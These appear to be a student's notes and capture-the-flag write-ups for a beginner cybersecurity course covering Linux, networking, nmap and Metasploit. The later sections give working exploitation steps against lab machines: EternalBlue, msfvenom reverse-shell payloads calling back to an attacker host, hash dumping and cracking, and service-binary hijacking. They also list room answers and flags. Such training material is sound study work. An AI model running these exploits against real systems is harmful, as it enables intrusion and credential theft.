These are my notes, answers, and writeups for all the rooms in the Complete Beginner Pathway.

Complete Beginner Introduction
- [Starting Out In CyberSec](#starting-out-in-cybersec)
- [Introductory Researching](#introductory-researching)

Linux Foundamentals
- [Linux Foundamentals Part 1](#linux-foundamentals-part-1)
- [Linux Foundamentals Part 2](#linux-foundamentals-part-2)
- [Linux Foundamentals Part 3](#linux-foundamentals-part-3)

Network Exploitation Basics
- [Introductory Networking](#introductory-networking)
  - [Encapsulation](#encapsulation)
  - [The TCP/IP Model](#the-tcpip-model)
  - [Networking Tools](#networking-tools)
- [Nmap](#nmap)
  - [Ports](#ports)
  - [Scan Types](#scan-types)
- [Network Services](#network-services)
  - [Server Message Block](#)

Web Hacking Fundamentals

Cryptography

Windows Exploitation Basics
- [Metasploit: Introduction](#metasploit-introduction)
- [Metasploit: Exploitation](#metasploit-exploitation)
- [Metasploit: Meterpreter](#metasploit-meterpreter)
- [Blue](#blue)

Shells and Privilege Escalation

Basic Computer Exploitation
- [Steel Mountain](#steel-mountain)

## Starting Out In CyberSec
- **Offensive Security**
  - involves attacking applications and technologies to discover vulnerabilites
  - most common job is penetration tester
    - person legally employed by organization to find vulns in their products
- **Defensive Security**
  - involves detecting and stopping attacks
  - security analyst
    - monitors systems and detects when they're being attacked
  - incident responder
    - brought in when attack has already happened
    - responsible for understanding the attack and its impacts
  - malware analysis

## Introductory Researching
- the ability to ***research efficiently*** is the most important quality for a hacker to have
- hacking requires a *vast* knowledge base
- helpful resouces for specific software exploits:
  - [Exploit-DB](https://www.exploit-db.com/) - contains exploits
  - [NVD](https://nvd.nist.gov/vuln/search) - keeps track of CVEs
  - `searchsploit` - CLI version of Exploit-DB
  - `man`

## Linux Foundamentals Part 1
- **Linux OS** is one of the most popular in the world 
- powers smart cars, android devices, supercomputers, home appliances, enterprise servers, and more
- umbrella term for multiple OS's that are based on **UNIX**
- `find -name <file> <dir>` - recursively look for `<file>` in `<dir>`
- `&` - run commands in background

## Linux Foundamentals Part 2
- Directories
  - `/etc` - store system files used by OS
    - system files are files essential for a computer system to function properly
    - ex: `shadow`, `passwd`
  - `/var` - stores data that is frequently accessed or written by services or applications running on the system 
    - ex: `log`, `opt`
  - `/root` - home for root user
  - `/tmp` - store data that is only needed to be accessed once or twice
    - any user can write to this folder by default

## Linux Foundamentals Part 3
- `scp <src> <dst>` - securely copy files
  - allows you to transfer files between two computers using the SSH protocol
- Processes are the programs running on the computer and are managed by the kernal.
- `ps aux` - also view processes run by other users and system processes
- `top` - real time statistics about processes
- You can send signals to `kill <PID>` a process
  - SIGTERM - allow cleanup
  - SIGKILL - no cleanup
  - SIGSTOP - stop a process
- The OS use **namespaces** to split computer resources to processes
  - namespaces isolate processes from one another
    - only those in the same namespace can see each other
- Process with PID 0 is started when system boots
- `systemd` is one of the first processes to start
  - manages user processes
  - sits between OS and user
  - any process we start will be a **children** of `systemd`
- `systemctl [option] [service]` allows us to interact with `systemd` process
  - there are 4 options: `start`, `stop`, `enable`, and `disable`
- Processes can run in the background or foreground
- the `cron` process allows us to schedule tasks
  - we interact with it through `crontabs`
    - a file with formatting recognised by `cron` to execute each line step-by-step
    - process started during boot

## Introductory Networking
- Real-world networking is based off TCP/IP model
- OSI (Open Systems Interconnection) Model
  - standardised model used to demonstrate theory behind networking
  ```
  7. Application 
      - provide interface for programs to transmit data
      - provide networking options for programs
  6. Presentation 
      - translate data into standardized format
      - handle encryptions, compressons, and other transformations
  5. Session
      - create and maintain a unique connection with remote computer 
  4. Transport
      - choose protocol (TCP, UDP, ...)
      - divide data into segments (TCP) or datagrams (UDP)
  3. Network
      - find fasetest route to IP address
  2. Data Link
      - add MAC address
      - check recieved data isn't corrupted
  1. Physical
      - translate binary data into signals and vice versa
      - send and recieve signals
  ```

### Encapsulation
- the **process** by which data is **sent** from one computer to another
- as data is passed down each layer, more information is added to the start
- in Data Link, information is appended to the end, too, for the recieving computer to verify that the data was not corrupted during transmission
- **de-encapsulation** - the reverse of encapsulation, done by recieving computer to read the data
- encapsulated data names: data, segments/datagrams, packets, frames, bits

### The TCP/IP Model
- basis for real world networking
- **Application**: application, presentation, session
- **Transport**: transport
- **Internet**: network
- **Network Interface**: data link, physical

### Networking Tools
- `ping <dst>` 
  - checks if a connection to a remote system is possible
  - uses ICMP protocol, which operates on Network layer
- `traceroute <dst>`
  - maps the route your request takes to the remote system
  - Windows `tracert` uses ICMP
  - Linux uses UDP
- `whois <domain>`
  - query who a domain name is registered to
- `dig <domain> @<dns-server-ip>`
  - query recursive DNS servers
- **Domain Name System (DNS)**
  - a TCP/IP protocol
  - Order is as follows:
    1. Local Host files
    2. Local DNS cache
    3. Recursive DNS server
    4. Root name server
        - Top-level domain servers (.com, .net, ...)
          - Authoritative name servers - source of information

## Nmap
- proper enumeration is extremely important
- **port scanning** - find what services are running on target system
- `nmap` connects to each port and determines if it's open, closed, or filtered
  - then it enumerates which services are running on each open port
### Ports
- when a computer runs a network service, it opens a port to recieve connections
- ports are necessary for making **multiple network requests** or having **multiple services running**
- network connections are made between two ports
- there are total of **65535** ports on each computer
### Scan Types
- `-sT` TCP
  - sends `syn`
  - OPEN: gets back `syn/ack`, sends `ack`
  - CLOSED: gets back `rst`
  - FILTERED: gets back nothing (protected by firewall)
- `-sS` SYN 
  - sends `syn`
  - OPEN: gets back `syn/ack`, sends `rst`
  - CLOSED: gets back `rst`
  - FILTERED: gets back nothing (protected by firewall)
- `-sU` UDP
  - OPEN: gets back nothing or `UDP` packet
  - CLOSED: gets back `ICMP` packet
  - FILTERED: gets back nothing
- `-sN` TCP NULL
  - sends TCP request with no flags
  - OPEN|FILTERED: gets back nothing
  - CLOSED: gets back `rst`
- `-sF` TCP FIN
  - sends TCP request with `FIN` flag
  - OPEN|FILTERED: gets back nothing
  - CLOSED: gets back `rst`
- `-sX` TCP Xmas
  - sends TCP request with `PSH, URG, FIN` flags
  - OPEN|FILTERED: gets back nothing
  - CLOSED: gets back `rst`
- `-sN` Ping Sweep
  - sends `ICMP` packet to each IP address for network
  - finds active hosts
  - sends `SYN` to port 443, `ACK` to port 80
- `-Pn` 
  - don't ping hosts before scanning
  - used to bypass firewalls which block ICMP packets

## Network Services
### Server Message Block 
- SMB: a client-server communication protocol used for sharing access to files, printers, and other resources on a network
- `enum4linux -a <ip>` enumerate SMB shares
- `smbclient //<ip>/<share> -U <user> -p <port>` access resources on server

## Metasploit: Introduction
- **Metasploit** is a tool for pentesting, ranging from enumeration to post-exploitation.
- **Metasploit Framework** is the open-source version that works from the command line.
- Main Components
  - msfconsole - CLI
  - modules - scanners, payloads, exploits, etc.
  - tools - msfvenom
- Definitions
  - vulnerability - a flaw in the target system
  - exploits - code that uses a vulnerability
  - **?** payload - code that runs on target system
- Modules
  - auxiliary - supporting modules like scanners, crawlers
  - encoder - encode exploit and payload to bypass signature-based antivirus
  - evasion - evade antivirus software
  - exploits
  - NOP - does nothing 
  - payload
    - singles - don't need to download additional components to run
    - **?** adapters - wrap single payloads
    - stagers - set up connection between Metasploit and target system
    - stages - downloaded by stagers, allow for larger payloads
  - post - post-exploitation
- `_` for single (in-line) payload, `/` for staged payload
- **msfconsole** is context-based, meaning all module options settings (unless global) will be lost if the module is changed.
- `setg` is `set` for global variables, likewise `unsetg` for `unsetg`
- The exploitation process is 3 steps:
  1. Find the exploit
  1. Customize the exploit
  1. Exploit the vulnerable service
    
### Questions
#### Task 2
- What is the name of the code taking advantage of a flaw on the target system?
  > Exploit
- What is the name of the code that runs on the target system to achieve the attacker's goal?
  > Payload
- What are self-contained payloads called?
  > Singles
- Is "windows/x64/pingback_reverse_tcp" among singles or staged payload?
  > Singles
#### Task 3
- How would you search for a module related to Apache?
  > search apache
- Who provided the auxiliary/scanner/ssh/ssh_login module?
  ```
  info auxiliary/scanner/ssh/ssh_login
  ```
  > todb
#### Task 4
- How would you set the LPORT value to 6666?
  > set LPORT 6666
- How would you set the global value for RHOSTS to 10.10.19.23 ?
  > setg RHOSTS 10.10.19.23
- What command would you use to clear a set payload?
  > unset payload
- What command do you use to proceed with the exploitation phase?
  > exploit
  
## Metasploit: Exploitation
- `search portscan` - list port scanning modules
- `nmap` scans can be made in `msfconsole` prompt
- Metasploit is **NOT** fast.
- NETBIOS (Network Basic Input Output System) allows computers to communicate over the network to share files or send files to printers.
- The NetBIOS name of the target system can give you an idea about its role and importance.
- Real pentesting will likely have several targets.
  - Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.
    - Start a PostgreSQL database
      ```
      systemctl start postgresq
      msfdb init
      msfconsole
      db_status
      ```
    - The database feature will allow you to create workspaces to isolate different projects.
    - `workspace` - list available workspaces, use `-h` for help
    -  `db_nmap` - runs `nmap`, saving result to database
    -  `hosts`, `services` - information relevant to hosts and services running on target systems
    -  Once the host information is stored in the database, you can use `hosts -R` to add this value to the RHOSTS parameter.
- Finding vulnerabilities using Metasploit rely heavily on your ability to scan and fingerprint the target.
- Choosing a working payload could become a trial and error process.
- `msfvenom` allows you to create payloads in many different formats for many different target systems.
- `msfvenom --list formats` - lists supported output formats
- `use exploit/multi/handler`
  - multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.
  - used to recieve incoming connection from payload
    - set up handler accordingly with payload, lhost, lport of payload, same values
- **Meterpreter** is a powerful tool that offers a lot of easy to use features during the post-exploitation phase.
  
## Questions
### Task 2
- How many ports are open on the target system?
  ```
  nmap <target_ip>
  ```
  > 5
- Using the relevant scanner, what NetBIOS name can you see?
  ```
  use auxiliary/scanner/netbios/nbname
  set rhosts <target_ip>
  run
  ```
  > ACME IT SUPPORT
- What is running on port 8000?
  ```
  use auxiliary/scanner/http/http_version
  set rhosts <target_ip>
  set lport 8000
  run
  ```
  > webfs/1.21
- What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.
  ```
  use auxiliary/scanner/smb/smb_login
  set rhosts <target_ip>
  set pass_file <pass_file>
  set smbuser penny
  run
  ```
  > leo1234
### Task 5
- Exploit one of the critical vulnerabilities on the target VM
  ```
  use exploit/windows/smb/ms17_010_eternalblue
  set payload windows/x64/meterpreter/reverse_tcp
  set rhosts <target_ip>
  run
  ```
- What is the content of the flag.txt file?
  ```
  shell
  cd ../..
  dir /b/s flag.txt
  type C:\Users\Jon\Documents\flag.txt
  ```
  > THM-5455554845
- What is the NTLM hash of the password of the user "pirate"?
  ```
  hashdump
  ```
  > 8ce9a3ebd1647fcc5e04025019f4b875
### Task 6
- Launch the VM attached to this task. The username is murphy, and the password is 1q2w3e4r. You can connect via SSH or launch this machine in the browser. Once on the terminal, type "sudo su" to get a root shell, this will make things easier.
  ```
  ssh murphy@<target_ip> 
  ```
- Create a meterpreter payload in the .elf format (on the AttackBox, or your attacking machine of choice).
  ```
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<port> -f elf > rev_shell.elf
  ```
- Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget http://ATTACKING_10.10.190.253:9000/shell.elf to download it to the target machine).
  ```
  attack: python3 -m http.server
  target: wget http://<attack_ip>:8000/rev_shell.elf
  ```
- Get a meterpreter session on the target machine.
  ```
  attack: use exploit/multi/handler
          set payload linux/x86/meterpreter/reverse_tcp
          set lhost <attack_ip>
          set lport <port>
          run
  target: ./rev_shell.elf
  ```
- Use a post exploitation module to dump hashes of other users on the system.
  ```
  background
  use post/linux/gather/hashdump
  set session <num>
  run
  ```
  > $6$qK0Kt4UO$HuCrlOJGbBJb5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHhPHeI2JU3m9OBOS7lUKkKMADLxCBcywzIxl7b.

# Metasploit: Meterpreter
- **Meterpreter** is a Metasploit payload
  - runs on **target** system, but is not installed on it
    - runs in **RAM** and does not write itself to disk to avoid detection by antivirus
      - antivirus software scan new files on disk by default
    - seen as a **process**, not a file
  - uses **encrypted communication** to try to avoid IPS, IDS detection
  - **?** acts as an agent within a command and control architecture
- Most antivirus software will detect Meterpreter.
- **Staged** payloads are sent in two steps:
  1. An initial payload (stager) is sent.
  2. This stager requests the rest of the payload.
- **Inline** payloads are sent in a single step.
- Meterpreter payloads are also divided into staged and inline versions.
- `msfvenom --list payloads | grep meterpreter` - list available Meterpreter versions
- Three factors for deciding which Meterpreter version to use:
  - target OS
  - components available on target system (Is python installed? IS this a php website?)
  - network connection types available on target system
- running `help` is always a good idea
- Meterpreter provides three primary categories of tools;
  - Built-in commands
  - Meterpreter tools
  - Meterpreter scripting
- `getuid` - display the user with which Meterpreter is currently running, gives idea of possible privilege level on the target system
- `ps` - list running processes, give PID information for migration
- `migrate <PID>`
  - Migrating to another process will help Meterpreter interact with it
  - For example, if you see a word processor running on the target, you can migrate to it and start capturing keystrokes sent by the user to this process.
  - Migrating to another process may also help you to have a more stable Meterpreter session.
> [!CAUTION]
> You may lose your user privileges if you migrate from a higher privileged user to a process started by a lower privileged user.
- `hashdump` - dumps content of the SAM database
  - SAM (Security Account Manager) stores user passwords on Windows systems.
  - Passwords are store in NTLM (New Technology LAN Manager) format.
- `search -f` - locate files
- `shell` - launch regular command-line shell on target system
- `getsystem` - attempt to elevate your privilege to that of local system
- Goals of post-exploitation phase:
  - Gathering further information about the target system
  - Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system
  - Privilege escalation
  - Lateral movement
  
## Questions
### Task 5
You can use the credentials below to simulate an initial compromise over SMB (Server Message Block) (using exploit/windows/smb/psexec)
> Username: ballen
> Password: Password1
- What is the computer name?
  ```
  use exploit/windows/smb/psexec
  set rhosts <target_ip>
  set smbpass Password1
  set smbuser ballen
  run
  sysinfo
  ```
  > ACME-TEST
- What is the target domain?
  > FLASH
- What is the name of the share likely created by the user?
  ```
  use auxiliary/scanner/smb/smb_enumshares
  set rhosts <target_ip>
  set smbpass Password1
  set smbuser ballen
  run

  background
  use post/windows/gather/enum_shares
  set session <num>
  run
  ```
  > speedster
- What is the NTLM hash of the jchambers user?
  
  **?** Use `ps` to find PID of lsass.exe.
  ```
  migrate <PID>
  hashdump
  ```
  > 69596c7aa1e8daee17f8e78870e25a5c
- What is the cleartext password of the jchambers user?
  
  The third field contains the 'aad3b' string, so we use `--format=NT`. 
  ```
  echo "69596c7aa1e8daee17f8e78870e25a5c" > hash.txt
  john --format=NT --wordlist=<rockyou.txt> hash.txt
  ```
  > Trustno1
- Where is the "secrets.txt"  file located? (Full path of the file)

  For some reason, `search -f secrets.txt` was taking super long, so I went another route.
  ```
  shell
  cd ../..
  dir /b/s secrets.txt
  ```
  > C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
- What is the Twitter password revealed in the "secrets.txt" file?
  ```
  cat C:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
  ```
  > KDSvbsw3849!
- Where is the "realsecret.txt" file located? (Full path of the file)
  ```
  search -f realsecret.txt
  ```
  > c:\inetpub\wwwroot\realsecret.txt
- What is the real secret?
  > The Flash is the fastest man alive

# Blue
### Task 1
- Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)
  ```
  nmap -sC -sV -A <target_ip>

  Output: -----------------------------------------------------------
  135/tcp   open  msrpc         Microsoft Windows RPC
  139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
  445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
  ```
- How many ports are open with a port number under 1000?
  > 3
- What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
  ```
  nmap --script=vuln -sV -A <target_ip>

  Output: -------------------------------------------------
  | smb-vuln-ms17-010: 
  |   VULNERABLE:
  |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
  |     State: VULNERABLE
  |     IDs:  CVE:CVE-2017-0143
  |     Risk factor: HIGH
  |       A critical remote code execution vulnerability exists in Microsoft SMBv1
  |        servers (ms17-010).
  |           
  |     Disclosure date: 2017-03-14
  |     References:
  |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
  |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
  |_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
  ```
  > ms17-010
### Task 2
- Start Metasploit: 
  ```
  msfconsole
  ```
- Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
  ```
  search ms17_010
  ```
  > exploit/windows/smb/ms17_010_eternalblue
- Show options and set the one required value. What is the name of this value? (All caps for submission)
  ```
  show options
  set rhosts <target ip>
  ```
  > RHOSTS
- Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

  `set payload windows/x64/shell/reverse_tcp`

  With that done, run the exploit!
  ```
  run
  ```
- Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 
  ```
  background
  ```
### Task 3
- If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 
  ```
  Google how to convert a shell to meterpreter shell in metasploit. First result gives the answer.
  ```
  > post/multi/manage/shell_to_meterpreter
- Select this (use MODULE_PATH). Show options, what option are we required to change?
  ```
  use post/multi/manage/shell_to_meterpreter
  show options
  ```
  > session
- Set the required option, you may need to list all of the sessions to find your target here.
  ```
  set session <num>
  ```
- Run! If this doesn't work, try completing the exploit from the previous task once more.
  ```
  run
  ```
- Once the meterpreter shell conversion completes, select that session for use.
  ```
  sessions <num>
  ```
- Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.
  ```
  getsystem
  ```
- List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).
  ```
  ps
  ```
- Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 
  ```
  migrate <PID>
  ```
### Task 4
- Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?
  ```
  hashdump

  Output: ---------------------------------------------------
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
  ```
  > Jon
- Copy this password hash to a file and research how to crack it. What is the cracked password?
  ```
  echo "ffb43f0de35be4d9917ac0cc8ad57f8d" > hash.txt
  john --format=NT --wordlist=<rockyou.txt> hash.txt
  ```
  > alqfna22
### Task 5
- Flag1? This flag can be found at the system root. 

  There are two ways of accomplishing this. We can return to the shell sessions and `cd` to the **C** directory and `type` out the flag, or we can `search` for it in **meterpreter** and `cat` out the flag.
  ```
  shell:  cd ../..
          type flag1.txt

  meterpreter:  search -f flag1.txt
                cat c:/flag1.txt
  ```
- Flag2? This flag can be found at the location where passwords are stored within Windows.
  ```
  shell:  dir /b/s flag2.txt
          type C:\Windows\System32\config\flag2.txt

  meterpreter:  search -f flag2.txt
                cat c:/Windows/System32/config/flag2.txt
  ```
  >
- flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
  ```
  shell:  dir /b/s flag3.txt
          type c:\Users\Jon\Documents\flag3.txt

  meterpreter:  search -f flag2.txt
                cat c:/Users/Jon/Documents/flag3.txt
  ```

# Steel Mountain
- **Powerup** is a powershell script for evaluating a Windows machine and determining any abnormalities. It is used for enumeration.
### Task 1
- Who is the employee of the month?
  ```
  curl <target_ip> --output text.html
  cat text.html

  Output: ===========================
  <img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
  ```
  > Bill Harper
### Task 2
- Scan the machine with nmap. What is the other port running a web server on?
  ```
  nmap --script=vuln -sV -A <target_ip>

  Output: ======================
  8080/tcp  open  http         HttpFileServer httpd 2.3
  ```
  > 8080
- Take a look at the other web server. What file server is running?

  Look up `HttpFileServer httpd 2.3` on Google and we get an [Exploit-DB link](https://www.exploit-db.com/exploits/39161). It tells us the file server and CVE number.
  > Rejetto HTTP File Server
- What is the CVE number to exploit this file server?
  > 2014-6287
- Use Metasploit to get an initial shell. What is the user flag?

  We will try to get a **meterpreter** shell. Looking at the hint, we know the flag will be in `C:\Users\bill\Desktop`, so we `cd` to it and `ls`. We see a `user.txt` file which contains the flag.
  ```
  search rejetto
  use 0
  set rhosts <target_ip>
  set rport 8080
  run

  Meterpreter:  cat c:/users/bill/Desktop/user.txt
  ```
  > b04763b6fcf51fcd7c13abc7db4fd365
### Task 3
First, `wget` [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) into your attack machine. Then we upload it into **meterpreter**. 
```
meterpreter > upload <PowerUp.ps1>
meterpreter > load powershell
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks

Output: =============================================
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```
- Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
  > AdvancedSystemCareService9
- The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

  Use msfvenom to generate a reverse shell as an Windows executable.

  `msfvenom -p windows/shell_reverse_tcp LHOST=<attack_ip> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`

  Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.

### Task 4






